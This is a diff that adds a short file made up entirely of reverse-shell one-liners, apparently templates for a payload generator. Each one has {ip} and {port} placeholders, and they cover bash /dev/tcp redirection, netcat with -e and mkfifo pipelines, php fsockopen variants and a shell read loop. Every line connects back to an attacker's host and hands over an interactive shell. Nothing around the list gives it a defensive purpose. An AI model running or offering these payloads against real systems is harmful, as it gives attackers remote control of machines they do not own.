@@ -1,0 +1,19 @@
+bash -i >& /dev/tcp/{ip}/{port} 0>&1
+
+0<&196;exec 196<>/dev/tcp/{ip}/{port}; sh <&196 >&196 2>&196
+
+/bin/bash -l > /dev/tcp/{ip}/{port} 0<&1 2>&1
+
+nc -e /bin/sh {ip} {port}
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f
+
+/bin/sh | nc {ip} {port}
+
+php -r '$sock=fsockopen("{ip}",{port});exec("/bin/bash -i <&3 >&3 2>&3");'
+
+php -r '$sock=fsockopen("{ip}",{port});exec("bash -i <&3 >&3 2>&3");'
+
+php -r '$sock=fsockopen("{ip}",{port});popen("/bin/sh -i","r");'
+
+exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done
